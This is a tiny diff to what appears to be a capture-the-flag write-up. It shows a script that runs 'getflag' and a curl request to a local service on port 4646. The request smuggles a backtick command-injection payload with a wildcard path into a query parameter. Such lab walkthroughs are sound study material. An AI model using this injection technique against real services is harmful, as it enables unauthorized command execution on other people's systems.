@@ -7,7 +7,7 @@ Thus, is we create the said /tmp/SCRIPT, it will match.
 
 #!/bin/bash
 
-getflag >/tmp/flag
+getflag > /tmp/flag
 
 -> chmod +x /tmp/SCRIPT
 -> curl localhost:4646?x='`/*/SCRIPT`'
